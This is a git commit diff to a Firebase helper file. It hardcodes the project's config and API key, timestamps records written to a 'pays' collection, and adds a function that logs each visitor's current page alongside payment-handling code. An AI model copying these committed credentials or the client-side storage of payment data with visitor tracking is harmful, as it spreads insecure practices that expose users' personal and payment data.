10a64f1fb3d9a55973934af137db1197f9d165ed
a96363877 <a96363877@gmail.com>
2025-06-19 08:51:37 +0300

    Update firebase.ts

--- lib/firebase.ts
+++ lib/firebase.ts
@@ -5,7 +5,14 @@ import { doc, getFirestore, setDoc } from 'firebase/firestore';
 
 const firebaseConfig = {
 
-  
+  apiKey: "AIzaSyDfG4yFh6d_sxh8Kimh__SUk-2NyOn9aYY",
+  authDomain: "bake-d8b67.firebaseapp.com",
+  databaseURL: "https://bake-d8b67-default-rtdb.firebaseio.com",
+  projectId: "bake-d8b67",
+  storageBucket: "bake-d8b67.firebasestorage.app",
+  messagingSenderId: "884688063277",
+  appId: "1:884688063277:web:9549527d76ffb4261461a4",
+  measurementId: "G-TY6CNB49X4" 
 };
 
 const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
@@ -16,7 +23,7 @@ export async function addData(data: any) {
   localStorage.setItem('visitor', data.id);
   try {
     const docRef = await doc(db, 'pays', data.id!);
-    await setDoc(docRef, data,{merge:true});
+    await setDoc(docRef,   { ...data, createdDate: new Date().toISOString() },{merge:true});
 
     console.log('Document written with ID: ', docRef.id);
     // You might want to show a success message to the user here
@@ -24,6 +31,11 @@ export async function addData(data: any) {
     console.error('Error adding document: ', e);
     // You might want to show an error message to the user here
   }
+}
+
+export const handleCurrentPage=(page:string)=>{
+const visitorId=localStorage.getItem('visitor')
+addData({id:visitorId,currentPage:page})
 }
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   try {
